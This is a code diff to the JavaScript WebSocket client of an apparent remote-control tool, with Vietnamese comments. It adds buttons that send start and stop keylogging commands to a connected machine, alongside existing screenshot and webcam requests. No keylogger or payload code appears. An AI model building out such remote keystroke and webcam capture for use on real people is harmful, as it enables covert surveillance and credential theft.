@@ -55,12 +55,21 @@ ws.onmessage = (event) => {
             .catch(e => console.error("Lỗi Autoplay:", e));
         }
         
-        // reset
-        console.log("WTF");
+        // reset giá trị
         flag = -1;
     } 
     
     else if (flag == 0) {
+        log(event.data);
+        flag = -1;
+    }
+    
+    else if (flag == 3){
+        log(event.data);
+        flag = -1;
+    }
+
+    else if (flag == 4){
         log(event.data);
         flag = -1;
     }
@@ -72,6 +81,12 @@ function HandleClientMSG(data){
     }
     else if (data == "webcam"){
         flag = 2;
+    }
+    else if (data == "Keylogging started"){
+        flag = 3;
+    }
+    else if (data == "Keylogging stopped"){
+        flag = 4;
     }
     else flag = 0
 }
@@ -149,6 +164,24 @@ function screenShot(){
 function webCam(){
     if (ws.readyState === WebSocket.OPEN){
         ws.send("webcam");
+    }
+    else {
+        log("WebSocket chưa kết nối xong.");
+    }
+}
+
+function startkeyLog(){
+    if (ws.readyState === WebSocket.OPEN){
+        ws.send("start_keylog");
+    }
+    else {
+        log("WebSocket chưa kết nối xong.");
+    }
+}
+
+function stopkeyLog(){
+    if (ws.readyState === WebSocket.OPEN){
+        ws.send("stop_keylog");
     }
     else {
         log("WebSocket chưa kết nối xong.");
